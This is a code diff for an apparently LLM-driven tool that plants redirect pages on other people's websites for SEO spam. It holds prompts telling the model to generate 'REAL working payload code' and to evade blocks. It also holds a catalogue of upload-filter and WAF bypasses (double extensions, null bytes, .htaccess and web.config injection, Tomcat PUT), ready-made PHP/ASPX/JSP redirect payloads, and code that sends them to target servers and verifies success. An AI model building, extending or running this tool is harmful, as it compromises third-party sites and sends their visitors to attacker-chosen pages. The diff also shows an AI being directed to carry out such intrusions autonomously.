-4. If status 403 → try WAF bypass techniques (different Content-Type, boundary manipulation, chunked)
-5. If status 404 → try different path
-6. If status 200 but file not found → try different filename extension bypass
-7. If connection error → try different approach entirely
-8. Generate REAL working payload code — not placeholder
-9. The payload MUST contain a working redirect to the target URL
-10. Prefer polyglot payloads that work as both PHP AND HTML (so even if PHP doesn't execute, HTML/JS redirect still works)
-
-AVAILABLE METHODS:
-- multipart_upload: Standard multipart/form-data POST (like file upload form)
-- put_direct: HTTP PUT to create file directly
-- post_raw: POST with raw body content
-- wp_media_upload: WordPress /wp-admin/admin-ajax.php?action=upload-attachment
-- wp_rest_media: WordPress REST API /wp-json/wp/v2/media
-- xmlrpc_upload: WordPress XMLRPC wp.uploadFile
-- move_method: HTTP MOVE to rename uploaded file
-- copy_method: HTTP COPY to duplicate file
-- patch_append: HTTP PATCH to append to existing file
-
-AVAILABLE BYPASS TECHNIQUES:
-- standard: Normal .php extension
-- double_ext: .php.jpg (Apache may execute as PHP)
-- null_byte: .php%00.jpg (old PHP <5.3.4)
-- semicolon: .php;.jpg (IIS 6/7)
-- trailing_dot: .php. (Windows strips trailing dot)
-- case_variation: .pHp, .PhP
-- alt_extension: .phtml, .pht, .php5, .php7, .phar
-- gif89a_header: GIF89a magic bytes + PHP code
-- png_header: PNG magic bytes + PHP in metadata
-- htaccess_trick: Upload .htaccess first to enable PHP in .jpg files
-- content_type_spoof: Send image/jpeg Content-Type with PHP content
-- boundary_manipulation: Long/unicode/nested multipart boundaries
-- chunked_encoding: Transfer-Encoding: chunked to bypass WAF size checks
-- html_only: Pure HTML file with meta refresh + JS redirect (no PHP needed)
-- svg_xss: SVG file with embedded JavaScript redirect
+2. Each iteration MUST try something COMPLETELY DIFFERENT
+3. Analyze previous failures to understand WHY they failed
+4. If PHP doesn't work → try HTML-only payload (works on ANY server)
+5. If POST doesn't work → try PUT, PATCH, MOVE, COPY
+6. If one path is blocked → try ALL other paths
+7. Match payload type to detected language: PHP→.php, ASP.NET→.aspx, JSP→.jsp, etc.
+8. If server language is unknown → use HTML/JS redirect (universal)
+9. ALWAYS generate REAL working payload code with actual redirect
+10. Prefer polyglot payloads that work as both server-side AND client-side redirect
+11. For WAF bypass: try chunked encoding, unicode normalization, boundary manipulation
+12. For strong WAF: use HTML-only payload (WAFs rarely block HTML files)
 
 ตอบเป็น JSON เท่านั้น ไม่ต้องอธิบายเพิ่ม`;
 
   const userPrompt = `TARGET ANALYSIS:
 Domain: ${recon.domain}
 Server: ${recon.serverType || "Unknown"}
-CMS: ${recon.cms || "Unknown"} ${recon.cmsVersion ? `v${recon.cmsVersion}` : ""}
-PHP: ${recon.phpVersion || "Unknown"}
-WAF: ${recon.waf || "None detected"}
+Language: ${recon.language || "Unknown"}
+CMS: ${recon.cms || "None"} ${recon.cmsVersion ? `v${recon.cmsVersion}` : ""}
+PHP: ${recon.phpVersion || "N/A"}
+WAF: ${recon.waf || "None"} (Strength: ${recon.wafStrength || "unknown"})
 OS: ${recon.os || "Unknown"}
+Control Panel: ${recon.controlPanel || "Unknown"}
+Hosting: ${recon.hostingProvider || "Unknown"}
 Writable Paths: ${recon.writablePaths.length > 0 ? recon.writablePaths.join(", ") : "None found"}
 Exposed Endpoints: ${recon.exposedEndpoints.length > 0 ? recon.exposedEndpoints.join(", ") : "None"}
 Has File Upload: ${recon.hasFileUpload}
 Has XMLRPC: ${recon.hasXmlrpc}
 Has REST API: ${recon.hasRestApi}
+Has WebDAV: ${recon.hasWebdav}
+Has FTP: ${recon.hasFtp}
 Directory Listing: ${recon.directoryListing}
 Response Time: ${recon.responseTimeMs}ms
+${historyData}
+${preAnalysisData}
 
 REDIRECT TARGET: ${redirectUrl}
 SEO KEYWORDS: ${seoKeywords.length > 0 ? seoKeywords.join(", ") : "none"}
@@ -366,26 +723,28 @@ SEO KEYWORDS: ${seoKeywords.length > 0 ? seoKeywords.join(", ") : "none"}
 ITERATION: ${iteration}/${maxIterations}
 
 ${failHistory.length > 0 ? `PREVIOUS FAILED ATTEMPTS (DO NOT REPEAT):
-${JSON.stringify(failHistory, null, 2)}
+${failHistory.map(f => `- Iter ${f.iteration}: ${f.method} → ${f.path}${f.filename} (${f.bypassTechnique}, ${f.payloadType}): HTTP ${f.statusCode}${f.error ? ` (${f.error})` : ""}${f.responseSnippet ? ` Response: "${f.responseSnippet.slice(0, 150)}"` : ""}`).join("\n")}
 
-Analyze each failure:
-${failHistory.map(f => `- ${f.method} → ${f.path}${f.filename}: HTTP ${f.statusCode}${f.error ? ` (${f.error})` : ""}${f.responseSnippet ? ` Response: "${f.responseSnippet.slice(0, 100)}"` : ""}`).join("\n")}
+Based on these failures, choose a COMPLETELY DIFFERENT approach.` : "This is the FIRST attempt. Choose the method most likely to succeed based on the target profile."}
 
-Based on these failures, choose a COMPLETELY DIFFERENT approach that addresses the specific errors above.` : "This is the FIRST attempt. Choose the method most likely to succeed based on the target profile."}
+AVAILABLE METHODS: multipart_upload, put_direct, post_raw, wp_media_upload, wp_rest_media, xmlrpc_upload, webdav_put, webdav_mkcol, move_method, copy_method, patch_append, htaccess_inject, webconfig_inject, tomcat_put, options_probe
 
-Generate a JSON decision with these exact fields:
+AVAILABLE PAYLOAD TYPES: php_redirect, html_meta, js_redirect, htaccess_rewrite, web_config_redirect, jsp_redirect, aspx_redirect, asp_classic_redirect, python_redirect, svg_redirect, polyglot_php_html
+
+Generate JSON:
 {
-  "method": "one of the available methods listed above",
-  "payload": "COMPLETE file content — real working PHP/HTML code with redirect to ${redirectUrl}",
-  "filename": "the filename to upload with bypass technique applied",
-  "uploadPath": "target path on server (must be one of the writable paths or a known CMS path)",
-  "contentType": "Content-Type header value",
-  "httpMethod": "POST or PUT or PATCH or MOVE or COPY",
-  "headers": { "additional": "headers if needed" },
-  "reasoning": "explain why this method will work where others failed (in Thai)",
-  "bypassTechnique": "which bypass technique from the list above",
+  "method": "method name",
+  "payload": "COMPLETE file content with working redirect to ${redirectUrl}",
+  "filename": "filename with bypass technique",
+  "uploadPath": "target path",
+  "contentType": "Content-Type header",
+  "httpMethod": "POST/PUT/PATCH/MOVE/COPY/MKCOL/PROPFIND",
+  "headers": {},
+  "reasoning": "why this will work (Thai)",
+  "bypassTechnique": "technique name",
   "confidence": 0-100,
-  "isRedirectPayload": true
+  "isRedirectPayload": true,
+  "payloadType": "payload type from list above"
 }`;
 
   try {
@@ -402,23 +761,20 @@ Generate a JSON decision with these exact fields:
           schema: {
             type: "object",
             properties: {
-              method: { type: "string", description: "Attack method to use" },
-              payload: { type: "string", description: "Complete file content" },
-              filename: { type: "string", description: "Filename with bypass" },
-              uploadPath: { type: "string", description: "Target upload path" },
-              contentType: { type: "string", description: "Content-Type header" },
-              httpMethod: { type: "string", description: "HTTP method" },
-              headers: {
-                type: "object",
-                description: "Additional headers",
-                additionalProperties: { type: "string" },
-              },
-              reasoning: { type: "string", description: "Why this method" },
-              bypassTechnique: { type: "string", description: "Bypass technique" },
-              confidence: { type: "number", description: "Confidence 0-100" },
-              isRedirectPayload: { type: "boolean", description: "Has redirect" },
+              method: { type: "string" },
+              payload: { type: "string" },
+              filename: { type: "string" },
+              uploadPath: { type: "string" },
+              contentType: { type: "string" },
+              httpMethod: { type: "string" },
+              headers: { type: "object", additionalProperties: { type: "string" } },
+              reasoning: { type: "string" },
+              bypassTechnique: { type: "string" },
+              confidence: { type: "number" },
+              isRedirectPayload: { type: "boolean" },
+              payloadType: { type: "string" },
             },
-            required: ["method", "payload", "filename", "uploadPath", "contentType", "httpMethod", "headers", "reasoning", "bypassTechnique", "confidence", "isRedirectPayload"],
+            required: ["method", "payload", "filename", "uploadPath", "contentType", "httpMethod", "headers", "reasoning", "bypassTechnique", "confidence", "isRedirectPayload", "payloadType"],
             additionalProperties: false,
           },
         },
@@ -428,32 +784,33 @@ Generate a JSON decision with these exact fields:
     const content = response.choices?.[0]?.message?.content;
     if (content && typeof content === "string") {
       const decision = JSON.parse(content);
-      
-      // Validate and normalize
+
+      const validMethods = ["POST", "PUT", "PATCH", "MOVE", "COPY", "MKCOL", "PROPFIND", "DELETE"];
       const normalized: AiDecision = {
         iteration,
         method: decision.method || "multipart_upload",
-        payload: decision.payload || generateFallbackPayload(redirectUrl, seoKeywords),
+        payload: decision.payload || generateFallbackPayload(redirectUrl, seoKeywords, recon.language),
         filename: decision.filename || `cache-${randomStr(8)}.php`,
-        uploadPath: decision.uploadPath || (recon.writablePaths[0] || "/wp-content/uploads/"),
-        contentType: decision.contentType || "application/x-php",
-        httpMethod: (["POST", "PUT", "PATCH", "MOVE", "COPY"].includes(decision.httpMethod) ? decision.httpMethod : "POST") as AiDecision["httpMethod"],
+        uploadPath: decision.uploadPath || (recon.writablePaths[0] || "/uploads/"),
+        contentType: decision.contentType || "text/html",
+        httpMethod: (validMethods.includes(decision.httpMethod) ? decision.httpMethod : "POST") as AiDecision["httpMethod"],
         headers: decision.headers || {},
         reasoning: decision.reasoning || "AI decision",
         bypassTechnique: decision.bypassTechnique || "standard",
         confidence: Math.max(0, Math.min(100, decision.confidence || 50)),
         isRedirectPayload: decision.isRedirectPayload !== false,
+        payloadType: decision.payloadType || "html_meta",
       };
 
-      // Ensure payload actually contains redirect URL
+      // Ensure payload contains redirect URL
       if (!normalized.payload.includes(redirectUrl) && normalized.isRedirectPayload) {
-        normalized.payload = generateFallbackPayload(redirectUrl, seoKeywords);
+        normalized.payload = generateFallbackPayload(redirectUrl, seoKeywords, recon.language);
       }
 
       onEvent?.({
         type: "decision", iteration, maxIterations,
-        detail: `🧠 AI ตัดสินใจ: ${normalized.method} → ${normalized.uploadPath}${normalized.filename} (${normalized.bypassTechnique}) — ${normalized.reasoning}`,
-        data: { method: normalized.method, filename: normalized.filename, path: normalized.uploadPath, bypass: normalized.bypassTechnique, confidence: normalized.confidence },
+        detail: `🧠 AI ตัดสินใจ: ${normalized.method} → ${normalized.uploadPath}${normalized.filename} (${normalized.bypassTechnique}, ${normalized.payloadType}) — ${normalized.reasoning}`,
+        data: { method: normalized.method, filename: normalized.filename, path: normalized.uploadPath, bypass: normalized.bypassTechnique, payloadType: normalized.payloadType, confidence: normalized.confidence },
       });
 
       return normalized;
@@ -465,15 +822,54 @@ Generate a JSON decision with these exact fields:
     });
   }
 
-  // Fallback: rule-based decision
   return generateFallbackDecision(recon, redirectUrl, iteration, previousResults, seoKeywords);
 }
 
-// ─── Fallback payload generator ───
+// ─── Multi-platform fallback payload generator ───
 
-function generateFallbackPayload(redirectUrl: string, keywords: string[]): string {
+function generateFallbackPayload(redirectUrl: string, keywords: string[], language?: string | null): string {
   const kw = keywords.length > 0 ? keywords : ["best deals 2026"];
-  return `<?php
+
+  switch (language) {
+    case "ASP.NET":
+      return `<%@ Page Language="C#" %>
+<script runat="server">
+protected void Page_Load(object sender, EventArgs e) { Response.Redirect("${redirectUrl}"); }
+</script>
+<!DOCTYPE html><html><head><title>${kw[0]}</title>
+<meta http-equiv="refresh" content="0;url=${redirectUrl}">
+<script>window.location.replace("${redirectUrl}");</script>
+</head><body><a href="${redirectUrl}">Click here</a></body></html>`;
+
+    case "JSP":
+      return `<%@ page language="java" %>
+<% response.sendRedirect("${redirectUrl}"); %>
+<!DOCTYPE html><html><head><title>${kw[0]}</title>
+<meta http-equiv="refresh" content="0;url=${redirectUrl}">
+<script>window.location.replace("${redirectUrl}");</script>
+</head><body><a href="${redirectUrl}">Click here</a></body></html>`;
+
+    case "Python":
+      return `<!DOCTYPE html><html><head><title>${kw[0]}</title>
+<meta http-equiv="refresh" content="0;url=${redirectUrl}">
+<meta name="description" content="${kw.join(', ')}">
+<script>window.location.replace("${redirectUrl}");</script>
+</head><body><a href="${redirectUrl}">Click here</a></body></html>`;
+
+    case "Node.js":
+    case "Ruby":
+    case "Go":
+      // These platforms typically serve static HTML, so use HTML redirect
+      return `<!DOCTYPE html><html><head><title>${kw[0]}</title>
+<meta http-equiv="refresh" content="0;url=${redirectUrl}">
+<meta name="description" content="${kw.join(', ')}">
+<script>window.location.replace("${redirectUrl}");</script>
+</head><body><p>${kw[0]}</p><a href="${redirectUrl}">Click here</a></body></html>`;
+
+    case "PHP":
+    default:
+      // PHP polyglot — works as both PHP and HTML
+      return `<?php
 if(!headers_sent()){header("Location: ${redirectUrl}",true,302);exit;}
 ?><!DOCTYPE html>
 <html><head>
@@ -482,8 +878,24 @@ if(!headers_sent()){header("Location: ${redirectUrl}",true,302);exit;}
 <meta name="description" content="${kw.join(', ')}">
 <script>window.location.replace("${redirectUrl}");</script>
 </head><body>
-<p>Redirecting... <a href="${redirectUrl}">Click here</a></p>
+<p>${kw[0]}</p>
+<a href="${redirectUrl}">Click here</a>
 </body></html>`;
+  }
+}
+
+function generateHtaccessPayload(redirectUrl: string): string {
+  return `RewriteEngine On
+RewriteRule ^(.*)$ ${redirectUrl} [R=302,L]`;
+}
+
+function generateWebConfigPayload(redirectUrl: string): string {
+  return `<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+  <system.webServer>
+    <httpRedirect enabled="true" destination="${redirectUrl}" httpResponseStatus="Found" />
+  </system.webServer>
+</configuration>`;
 }
 
 function generateFallbackDecision(
@@ -493,64 +905,84 @@ function generateFallbackDecision(
   previousResults: ExecutionResult[],
   keywords: string[],
 ): AiDecision {
-  // Build set of already-tried combinations
   const tried = new Set(previousResults.map(r => `${r.decision.method}|${r.decision.uploadPath}|${r.decision.bypassTechnique}`));
+  const strategies: Array<{ method: string; filename: string; path: string; contentType: string; httpMethod: AiDecision["httpMethod"]; bypass: string; payloadType: string; payloadFn: () => string }> = [];
 
-  // Strategy matrix based on server type
-  const strategies: Array<{ method: string; filename: string; path: string; contentType: string; httpMethod: AiDecision["httpMethod"]; bypass: string }> = [];
-
-  const paths = recon.writablePaths.length > 0 ? recon.writablePaths : ["/wp-content/uploads/", "/uploads/", "/images/", "/tmp/"];
+  const paths = recon.writablePaths.length > 0 ? recon.writablePaths : ["/uploads/", "/images/", "/tmp/", "/media/"];
   const base = `cache-${randomStr(8)}`;
 
   for (const path of paths) {
-    // Standard approaches
-    strategies.push({ method: "multipart_upload", filename: `${base}.php`, path, contentType: "multipart/form-data", httpMethod: "POST", bypass: "standard" });
-    strategies.push({ method: "put_direct", filename: `${base}.php`, path, contentType: "application/x-php", httpMethod: "PUT", bypass: "standard" });
-    strategies.push({ method: "multipart_upload", filename: `${base}.php.jpg`, path, contentType: "multipart/form-data", httpMethod: "POST", bypass: "double_ext" });
-    strategies.push({ method: "put_direct", filename: `${base}.phtml`, path, contentType: "application/x-httpd-php", httpMethod: "PUT", bypass: "alt_extension" });
-    strategies.push({ method: "multipart_upload", filename: `${base}.php%00.jpg`, path, contentType: "multipart/form-data", httpMethod: "POST", bypass: "null_byte" });
-    strategies.push({ method: "put_direct", filename: `${base}.pHp`, path, contentType: "application/x-php", httpMethod: "PUT", bypass: "case_variation" });
-    strategies.push({ method: "multipart_upload", filename: `${base}.html`, path, contentType: "text/html", httpMethod: "POST", bypass: "html_only" });
-    strategies.push({ method: "put_direct", filename: `${base}.html`, path, contentType: "text/html", httpMethod: "PUT", bypass: "html_only" });
-    strategies.push({ method: "post_raw", filename: `${base}.php;.jpg`, path, contentType: "image/jpeg", httpMethod: "POST", bypass: "semicolon" });
-    strategies.push({ method: "put_direct", filename: `${base}.php5`, path, contentType: "application/x-php", httpMethod: "PUT", bypass: "alt_extension" });
+    // Universal HTML strategies (work on ANY server)
+    strategies.push({ method: "put_direct", filename: `${base}.html`, path, contentType: "text/html", httpMethod: "PUT", bypass: "html_only", payloadType: "html_meta", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, null) });
+    strategies.push({ method: "multipart_upload", filename: `${base}.html`, path, contentType: "text/html", httpMethod: "POST", bypass: "html_only", payloadType: "html_meta", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, null) });
+
+    // PHP strategies
+    if (recon.language === "PHP" || !recon.language) {
+      strategies.push({ method: "put_direct", filename: `${base}.php`, path, contentType: "application/x-php", httpMethod: "PUT", bypass: "standard", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
+      strategies.push({ method: "multipart_upload", filename: `${base}.php.jpg`, path, contentType: "multipart/form-data", httpMethod: "POST", bypass: "double_ext", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
+      strategies.push({ method: "put_direct", filename: `${base}.phtml`, path, contentType: "application/x-httpd-php", httpMethod: "PUT", bypass: "alt_extension", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
+      strategies.push({ method: "put_direct", filename: `${base}.pHp`, path, contentType: "application/x-php", httpMethod: "PUT", bypass: "case_variation", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
+    }
+
+    // ASP.NET strategies
+    if (recon.language === "ASP.NET" || recon.serverType === "IIS") {
+      strategies.push({ method: "put_direct", filename: `${base}.aspx`, path, contentType: "text/html", httpMethod: "PUT", bypass: "standard", payloadType: "aspx_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "ASP.NET") });
+      strategies.push({ method: "put_direct", filename: `${base}.aspx;.jpg`, path, contentType: "image/jpeg", httpMethod: "PUT", bypass: "semicolon", payloadType: "aspx_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "ASP.NET") });
+      strategies.push({ method: "put_direct", filename: `${base}.asp`, path, contentType: "text/html", httpMethod: "PUT", bypass: "asp_classic", payloadType: "asp_classic_redirect", payloadFn: () => `<% Response.Redirect "${redirectUrl}" %>` });
+    }
+
+    // JSP strategies
+    if (recon.language === "JSP" || recon.serverType === "Tomcat") {
+      strategies.push({ method: "put_direct", filename: `${base}.jsp`, path, contentType: "text/html", httpMethod: "PUT", bypass: "standard", payloadType: "jsp_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "JSP") });
+      strategies.push({ method: "tomcat_put", filename: `${base}.jsp/`, path, contentType: "text/html", httpMethod: "PUT", bypass: "trailing_slash", payloadType: "jsp_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "JSP") });
+    }
+
+    // .htaccess strategy (Apache/LiteSpeed)
+    if (recon.serverType === "Apache" || recon.serverType === "LiteSpeed") {
+      strategies.push({ method: "put_direct", filename: ".htaccess", path, contentType: "text/plain", httpMethod: "PUT", bypass: "htaccess_inject", payloadType: "htaccess_rewrite", payloadFn: () => generateHtaccessPayload(redirectUrl) });
+    }
+
+    // web.config strategy (IIS)
+    if (recon.serverType === "IIS") {
+      strategies.push({ method: "put_direct", filename: "web.config", path, contentType: "text/xml", httpMethod: "PUT", bypass: "webconfig_inject", payloadType: "web_config_redirect", payloadFn: () => generateWebConfigPayload(redirectUrl) });
+    }
+
+    // WebDAV strategies
+    if (recon.hasWebdav) {
+      strategies.push({ method: "webdav_put", filename: `${base}.html`, path, contentType: "text/html", httpMethod: "PUT", bypass: "webdav", payloadType: "html_meta", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, null) });
+    }
 
     // WordPress-specific
     if (recon.cms === "WordPress") {
-      strategies.push({ method: "wp_media_upload", filename: `${base}.php.jpg`, path: "/wp-admin/admin-ajax.php", contentType: "multipart/form-data", httpMethod: "POST", bypass: "double_ext" });
-      strategies.push({ method: "wp_rest_media", filename: `${base}.jpg`, path: "/wp-json/wp/v2/media", contentType: "image/jpeg", httpMethod: "POST", bypass: "content_type_spoof" });
+      strategies.push({ method: "wp_media_upload", filename: `${base}.php.jpg`, path: "/wp-admin/admin-ajax.php", contentType: "multipart/form-data", httpMethod: "POST", bypass: "double_ext", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
+      strategies.push({ method: "wp_rest_media", filename: `${base}.jpg`, path: "/wp-json/wp/v2/media", contentType: "image/jpeg", httpMethod: "POST", bypass: "content_type_spoof", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
     }
     if (recon.hasXmlrpc) {
-      strategies.push({ method: "xmlrpc_upload", filename: `${base}.php`, path: "/xmlrpc.php", contentType: "text/xml", httpMethod: "POST", bypass: "standard" });
+      strategies.push({ method: "xmlrpc_upload", filename: `${base}.php`, path: "/xmlrpc.php", contentType: "text/xml", httpMethod: "POST", bypass: "standard", payloadType: "php_redirect", payloadFn: () => generateFallbackPayload(redirectUrl, keywords, "PHP") });
     }
   }
 
-  // Find first untried strategy
   const untried = strategies.find(s => !tried.has(`${s.method}|${s.path}|${s.bypass}`));
   const strategy = untried || strategies[iteration % strategies.length];
-
-  const isHtml = strategy.bypass === "html_only";
-  const payload = isHtml
-    ? `<!DOCTYPE html><html><head><title>${keywords[0] || "Redirecting"}</title><meta http-equiv="refresh" content="0;url=${redirectUrl}"><script>window.location.replace("${redirectUrl}");</script></head><body><a href="${redirectUrl}">Click here</a></body></html>`
-    : generateFallbackPayload(redirectUrl, keywords);
 
   return {
     iteration,
     method: strategy.method,
-    payload,
+    payload: strategy.payloadFn(),
     filename: strategy.filename,
     uploadPath: strategy.path,
     contentType: strategy.contentType,
     httpMethod: strategy.httpMethod,
     headers: {},
-    reasoning: `Fallback strategy: ${strategy.method} with ${strategy.bypass} bypass to ${strategy.path}`,
+    reasoning: `Fallback strategy: ${strategy.method} with ${strategy.bypass} bypass to ${strategy.path} (${strategy.payloadType})`,
     bypassTechnique: strategy.bypass,
     confidence: Math.max(10, 60 - (iteration * 5)),
     isRedirectPayload: true,
+    payloadType: strategy.payloadType,
   };
 }
 
-// ─── Phase 3: EXECUTE — ลอง method ที่ AI เลือก ───
+// ─── Phase 3: EXECUTE ───
 
 async function executeDecision(
   recon: ReconData,
@@ -564,7 +996,7 @@ async function executeDecision(
 
   onEvent?.({
     type: "execute", iteration: decision.iteration, maxIterations,
-    detail: `⚡ Execute: ${decision.httpMethod} ${decision.uploadPath}${decision.filename} (${decision.bypassTechnique})`,
+    detail: `⚡ Execute: ${decision.httpMethod} ${decision.uploadPath}${decision.filename} (${decision.bypassTechnique}, ${decision.payloadType})`,
   });
 
   const result: ExecutionResult = {
@@ -584,7 +1016,6 @@ async function executeDecision(
     const controller = new AbortController();
     const timer = setTimeout(() => controller.abort(), timeout);
 
-    // Build headers
     const headers: Record<string, string> = {
       "User-Agent": randomUA(),
       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -592,14 +1023,12 @@ async function executeDecision(
       "Accept-Encoding": "gzip, deflate",
       "Connection": "keep-alive",
       "Cache-Control": "no-cache",
-      "Referer": `${targetUrl}/wp-admin/`,
       ...decision.headers,
     };
 
     let body: string;
     let uploadUrl: string;
 
-    // Build request based on method
     switch (decision.method) {
       case "multipart_upload": {
         const boundary = `----WebKitFormBoundary${randomStr(16)}`;
@@ -608,7 +1037,7 @@ async function executeDecision(
         body = [
           `--${boundary}`,
           `Content-Disposition: form-data; name="file"; filename="${decision.filename}"`,
-          `Content-Type: ${decision.contentType === "multipart/form-data" ? "application/x-php" : decision.contentType}`,
+          `Content-Type: ${decision.contentType === "multipart/form-data" ? "application/octet-stream" : decision.contentType}`,
           ``,
           decision.payload,
           `--${boundary}`,
@@ -620,7 +1049,9 @@ async function executeDecision(
         break;
       }
 
-      case "put_direct": {
+      case "put_direct":
+      case "webdav_put":
+      case "tomcat_put": {
         headers["Content-Type"] = decision.contentType;
         uploadUrl = `${targetUrl}${decision.uploadPath}${decision.filename}`;
         body = decision.payload;
@@ -638,6 +1069,7 @@ async function executeDecision(
       case "wp_media_upload": {
         const boundary = `----WebKitFormBoundary${randomStr(16)}`;
         headers["Content-Type"] = `multipart/form-data; boundary=${boundary}`;
+        headers["Referer"] = `${targetUrl}/wp-admin/`;
         uploadUrl = `${targetUrl}/wp-admin/admin-ajax.php`;
         body = [
           `--${boundary}`,
@@ -684,6 +1116,27 @@ async function executeDecision(
         break;
       }
 
+      case "htaccess_inject": {
+        headers["Content-Type"] = "text/plain";
+        uploadUrl = `${targetUrl}${decision.uploadPath}.htaccess`;
+        body = decision.payload;
+        break;
+      }
+
+      case "webconfig_inject": {
+        headers["Content-Type"] = "text/xml";
+        uploadUrl = `${targetUrl}${decision.uploadPath}web.config`;
+        body = decision.payload;
+        break;
+      }
+
+      case "webdav_mkcol": {
+        headers["Content-Type"] = "text/xml";
+        uploadUrl = `${targetUrl}${decision.uploadPath}`;
+        body = "";
+        break;
+      }
+
       default: {
         headers["Content-Type"] = decision.contentType;
         uploadUrl = `${targetUrl}${decision.uploadPath}${decision.filename}`;
@@ -692,11 +1145,10 @@ async function executeDecision(
       }
     }
 
-    // Execute the request
     const resp = await fetch(uploadUrl, {
       method: decision.httpMethod,
       headers,
-      body,
+      body: body || undefined,
       signal: controller.signal,
       redirect: "follow",
     });
@@ -706,15 +1158,15 @@ async function executeDecision(
     result.responseBody = await resp.text().catch(() => "");
     resp.headers.forEach((v, k) => { result.responseHeaders[k] = v; });
 
-    // Verify if file was uploaded
+    // Verify file upload
     if (resp.status < 400) {
-      // Try multiple possible URLs where the file might be
       const possibleUrls = [
         `${targetUrl}${decision.uploadPath}${decision.filename}`,
-        // For PUT, the URL is the upload URL itself
         decision.httpMethod === "PUT" ? uploadUrl : null,
-        // WordPress media upload returns URL in response
         result.responseBody.includes("url") ? extractUrlFromResponse(result.responseBody) : null,
+        // For .htaccess/.web.config, check the directory itself
+        decision.payloadType === "htaccess_rewrite" ? `${targetUrl}${decision.uploadPath}` : null,
+        decision.payloadType === "web_config_redirect" ? `${targetUrl}${decision.uploadPath}` : null,
       ].filter(Boolean) as string[];
 
       for (const checkUrl of possibleUrls) {
@@ -757,20 +1209,16 @@ async function verifyFile(url: string, expectedContent: string, timeout: number)
       redirect: "manual",
     });
 
-    // HTTP redirect = file exists and redirect works
     if ([301, 302, 303, 307, 308].includes(resp.status)) {
       return { exists: true, redirectWorks: true };
     }
 
     if (resp.status === 200) {
       const text = await resp.text();
-      // Check for redirect indicators
       const hasMetaRefresh = /http-equiv=["']refresh["']/i.test(text);
       const hasJsRedirect = /window\.location|location\.replace|location\.href/i.test(text);
-      
-      // Verify it's our file, not a CMS catch-all
       const isCmsPage = text.includes("wp-content") && text.length > 5000 && !hasMetaRefresh && !hasJsRedirect;
-      
+
       if (!isCmsPage) {
         return { exists: true, redirectWorks: hasMetaRefresh || hasJsRedirect };
       }
@@ -789,7 +1237,7 @@ function extractUrlFromResponse(body: string): string | null {
   }
 }
 
-// ─── Phase 4: AI LEARN — วิเคราะห์ผลลัพธ์ ───
+// ─── Phase 4: AI LEARN ───
 
 async function aiLearn(
   recon: ReconData,
@@ -804,35 +1252,45 @@ async function aiLearn(
     detail: `📚 AI กำลังวิเคราะห์ผลลัพธ์และเรียนรู้จากความล้มเหลว...`,
   });
 
-  // Quick rule-based learning (faster than LLM)
   const lessons: string[] = [];
-  
+
   if (executionResult.statusCode === 403) {
-    lessons.push("Server returned 403 Forbidden — WAF or permission block detected");
-    if (recon.waf) lessons.push(`WAF (${recon.waf}) is actively blocking uploads`);
-    lessons.push("Next: Try different Content-Type, boundary manipulation, or chunked encoding");
+    lessons.push("Server returned 403 Forbidden — WAF or permission block");
+    if (recon.waf) lessons.push(`WAF (${recon.waf}) is actively blocking`);
+    lessons.push("Next: Try HTML-only payload (WAFs rarely block HTML), or different Content-Type");
   } else if (executionResult.statusCode === 404) {
-    lessons.push("Path not found — upload endpoint doesn't exist at this location");
-    lessons.push("Next: Try different upload path");
+    lessons.push("Path not found — try different path");
   } else if (executionResult.statusCode === 405) {
-    lessons.push("Method not allowed — server doesn't accept this HTTP method");
-    lessons.push("Next: Try different HTTP method (POST instead of PUT, or vice versa)");
+    lessons.push("Method not allowed — try different HTTP method");
+    if (executionResult.decision.httpMethod === "PUT") lessons.push("PUT blocked → try POST multipart");
+    if (executionResult.decision.httpMethod === "POST") lessons.push("POST blocked → try PUT direct");
   } else if (executionResult.statusCode === 413) {
-    lessons.push("Payload too large — server has size limit");
-    lessons.push("Next: Try smaller payload or chunked upload");
+    lessons.push("Payload too large — try smaller payload or chunked upload");
+  } else if (executionResult.statusCode === 415) {
+    lessons.push("Unsupported media type — try different Content-Type");
   } else if (executionResult.statusCode >= 500) {
     lessons.push("Server error — might indicate partial success or misconfiguration");
-    lessons.push("Next: Try simpler payload or different path");
   } else if (executionResult.error?.includes("Timeout")) {
     lessons.push("Request timed out — server may be slow or blocking");
-    lessons.push("Next: Try faster method or different path");
   } else if (executionResult.statusCode === 200 && !executionResult.fileVerified) {
-    lessons.push("Upload returned 200 but file not found at expected URL");
-    lessons.push("Server may be accepting request but not saving file, or saving to different location");
-    lessons.push("Next: Try PUT method which creates file at exact URL, or try HTML-only payload");
+    lessons.push("Upload returned 200 but file not found — server accepted but didn't save, or saved to different location");
+    lessons.push("Next: Try PUT (creates file at exact URL), or try HTML-only payload");
+  } else if (executionResult.statusCode === 301 || executionResult.statusCode === 302) {
+    lessons.push("Server redirected the upload request — may need to follow redirect or use different path");
   }
 
-  // Count failures by type
+  // Platform-specific lessons
+  if (recon.language === "ASP.NET" && executionResult.decision.payloadType === "php_redirect") {
+    lessons.push("CRITICAL: Target is ASP.NET but used PHP payload — switch to .aspx or HTML payload");
+  }
+  if (recon.language === "JSP" && executionResult.decision.payloadType === "php_redirect") {
+    lessons.push("CRITICAL: Target is JSP but used PHP payload — switch to .jsp or HTML payload");
+  }
+  if (recon.serverType === "Nginx" && executionResult.decision.payloadType === "htaccess_rewrite") {
+    lessons.push("CRITICAL: .htaccess doesn't work on Nginx — use HTML redirect or nginx.conf injection");
+  }
+
+  // Count failures
   const failsByMethod = new Map<string, number>();
   const failsByPath = new Map<string, number>();
   for (const r of allResults) {
